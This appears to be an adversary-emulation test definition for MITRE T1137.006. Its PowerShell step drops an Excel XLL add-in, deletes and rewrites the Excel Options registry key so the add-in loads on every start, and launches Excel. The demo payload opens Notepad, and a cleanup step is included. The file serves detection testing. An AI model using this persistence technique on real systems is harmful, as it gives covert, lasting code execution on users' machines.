api_version: "2.0"
name: Persistent Code Execution Via Excel Add-in File (XLL)
description: |
    Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
    The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
uuid: 9c307886-9fef-41d5-b344-073a0f5b2f5f
mitre:
    tactics:
        - 'TA0003: Persistence'
    techniques:
        - 'T1137: Office Application Startup'
    subtechniques:
        - 'T1137.006: Add-ins'
requirements:
    platforms:
        - os: windows
steps:
    - name: persistent-code-execution-via-excel-add-in-file-(xll)
      inline: |
        $excelApp = New-Object -COMObject "Excel.Application"
        if(-not $excelApp.path.contains("Program Files (x86)")){
            Write-Host "64-bit Office"
            Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        else{
          Write-Host "32-bit Office"
          Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        $ver = $excelApp.version
        $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
        Remove-Item $ExcelRegPath -ErrorAction Ignore
        New-Item -type Directory $ExcelRegPath | Out-Null
        New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
        $excelApp.Quit()
        Start-Process "Excel"
      executor: powershell
      cleanup:
        inline: |
            $ver = (New-Object -COMObject "Excel.Application").version
            Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
            Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
            Start-Sleep 3
            Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
        executor: powershell
